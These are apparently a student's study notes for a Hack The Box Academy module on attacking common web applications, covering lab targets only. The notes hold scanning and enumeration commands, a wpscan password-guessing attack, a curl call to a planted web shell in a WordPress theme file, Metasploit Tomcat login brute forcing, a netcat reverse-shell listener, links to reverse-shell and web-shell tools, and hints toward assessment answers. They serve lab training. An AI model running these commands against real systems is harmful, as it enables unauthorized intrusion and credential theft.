```
theo854@htb[/htb]$ nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
```
https://github.com/RedSiege/EyeWitness
https://github.com/michenriksen/aquatone
https://www.scribd.com/document/925007218/Attacking-Common-Applications-pdf

`External Penetration Test - <Client Name>`

- `Scope` (including in-scope IP addresses/ranges, URLs, any fragile hosts, testing timeframes, and any limitations or other relative information we need handy)
- `Client Points of Contact`
- `Credentials`
- `Discovery/Enumeration`
    - `Scans`
    - `Live hosts`
- `Application Discovery`
    - `Scans`
    - `Interesting/Notable Hosts`
- `Exploitation`
    - `<Hostname or IP>`
    - `<Hostname or IP>`
- `Post-Exploitation`
    - `<Hostname or IP>`
    - `<Hostname or IP>`


```
 eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
```

```
IP="10.129.203.254"
awk -v ip="$IP" '{print ip " " $1}' vhosts.txt | sudo tee -a /etc/hosts

```

add vhosts to scope_list then run nmap
```
sudo  nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list

```
-in order to use eyewitness clone the git repo run the setup.sh in the setup folder then go the the python folder and run eyewitness
```
python EyeWitness.py --web -x web_discovery.xml -d inlanefreight_eyewitness
```

Aquatone
```
wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
```
```
unzip aquatone_linux_amd64_1.7.0.zip 
```
```
cat web_discovery.xml | ./aquatone -nmap
```

Enumeration
```
curl -s http://blog.inlanefreight.local | grep WordPress

<meta name="generator" content="WordPress 5.8" /
```
```
curl -s http://blog.inlanefreight.local/ | grep themes
```
```
curl -s http://blog.inlanefreight.local/ | grep plugins
```
`http://blog.inlanefreight.local/wp-content/plugins/mail-masta/` shows us that directory listing is enabled and that a `readme.txt` file is present
```
wpscan --url http://blog.inlanefreight.local/ --enumerate
```
-go to a different page and maybe find other plugins using the manual exploitation
-look for the wp-sitemap-page view-source:http://blog.inlanefreight.local/wp-content/plugins/wp-sitemap-page/readme.txt
-after running the scan find a user and the guess his password
```
sudo wpscan --password-attack xmlrpc -t 20 -U doug -P rockyou.txt --url http://blog.inlanefreight.local

```

```
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=find%20/var/www%20-name%20flag\*
/var/www/blog.inlanefreight.local/wp-content/uploads/2021/08/flag.txt
/var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt
/var/www/drupal.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt
/var/www/dev.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt

```


#JOOMLA

```
sudo pip3 install droopescan
```
```
droopescan scan joomla --url http://dev.inlanefreight.local/
```

```
python2 -m pip install bs4
```
```
python2 joomlascan.py -u http://dev.inlanefreight.local
```
https://github.com/ajnik/joomla-bruteforce

#Drupal
```
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```
```
droopescan scan drupal -u http://drupal-qa.inlanefreight.local

```
drupcalgedon https://academy.hackthebox.com/app/module/113/section/1209

#Tomcat
-run metaspoit msfconsole; use scanner/http/tomcat_mgr_login
```
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
```
web shell upload .war file https://academy.hackthebox.com/app/module/113/section/1211
-follow the steps listed there to get reverse shell
```
find / -type f -name "tomcat_flag.txt" 2>/dev/null
```
https://my-gitbook-2.gitbook.io/cbbh/19.-attacking-common-applications/19.-attacking-common-web-applications/servlet-containers-software-development/attacking-tomcat?q= SOLUTIONS AND NOTES

Attacking splunk
```
sudo nmap -sV 10.129.201.50
```
see if the premium version was downgraded
https://github.com/0xjpuff/reverse_shell_splunk/tree/master splunk reverse shell
https://academy.hackthebox.com/app/module/113/section/1213 run the steps in the module
follow these steps for PRTG from both the gitbook and scribd

Attacking Gitlab
```
./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist /opt/useful/seclists/Usernames/cirt-default-usernames.txt | grep exists

```
https://academy.hackthebox.com/app/module/113/section/1217

Attacking tomcat cgi
https://academy.hackthebox.com/app/module/113/section/2140

nc -lnvp 4444 for a netcat listener for reverse shell

Coldfusion
https://academy.hackthebox.com/app/module/113/section/2135
```
searchsploit adobe coldfusion
```

IIS tilde enumeration
-install java https://ubuntuhandbook.org/index.php/2022/03/install-jdk-18-ubuntu/
-install iis_shortlist https://github.com/irsdl/IIS-ShortName-Scanner
```
java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
```
```
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```
```
gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
```


```
nmap -p- -sC -sV --open --min-rate=1000 10.129.204.229
```
```
nmap -sV 10.129.211.55
```

Assessment2
What is the URL of the WorldPress instance?
```
ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.129.201.90 -H "Host: FUZZ.inlanefreight.local" -mc 200 -fs 0 -fl 923 -ic

```
What is the FQDN of the third vhost?
-go to the gitlab and explore the virtualhost project and read the readme file

What is the admin password to access this application?
-explore the gitlab more and find the naigos postgresql page and then go to install and find the password


Obtain reverse shell access on the target and submit the contents of the flag.txt file.
-login into the nagios server with the credentials from the folder above find the version in the corner
-use metasploit and find the metasploit module to use using search then show options